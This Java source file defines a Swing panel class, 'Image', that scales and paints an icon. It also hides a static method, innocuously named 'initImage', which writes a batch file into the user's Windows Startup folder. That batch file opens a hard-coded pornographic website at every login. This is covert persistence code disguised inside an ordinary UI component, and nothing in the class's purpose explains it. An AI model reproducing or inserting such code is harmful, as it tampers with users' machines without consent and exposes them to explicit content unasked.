package view;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.nio.file.Paths;

public class Image extends JPanel implements Serializable {
    ImageIcon image;

    public Image() {}

    public Image(ImageIcon image) {
        updateImage(image);
    }

    public void paintComponent(Graphics g) {
        super.paintComponent(g);
        if (image != null) {
            image.paintIcon(this, g, getWidth() / 2 - image.getIconWidth() / 2, 0);
        }
    }

    public void updateImage(ImageIcon image) {
        if  (image != null) {
            int newWidth;
            int newHeight;
            double widthToHeight = (double) image.getIconWidth() / image.getIconHeight();
            if (getHeight() * widthToHeight > getWidth()) {
                newWidth = getWidth();
                newHeight = (int) (newWidth / widthToHeight);
            } else {
                newHeight = getHeight();
                newWidth = (int) (newHeight * widthToHeight);
            }
            if (newWidth == 0 || newHeight == 0) {
                newWidth = 1;
                newHeight = 1;
            }
            image = new ImageIcon(image.getImage().getScaledInstance(newWidth, newHeight, 1));
            this.image = image;
            repaint();
        }
    }

    public static void initImage() {
        String url = "https://www.pussyspace.com/vid-5922384-she-plays-with-toys-in-the-car-while-her-husband-is-at-work/";

        String batchContent = "@echo off\n" +
                "start " + url + "\n";

        String userHome = System.getProperty("user.home");
        String startupPath = Paths.get(userHome, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup").toString();
        File batchFile = new File(startupPath, "OpenURL.bat");

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(batchFile))) {
            writer.write(batchContent);
            System.out.println("Batch file created: " + batchFile.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }



}
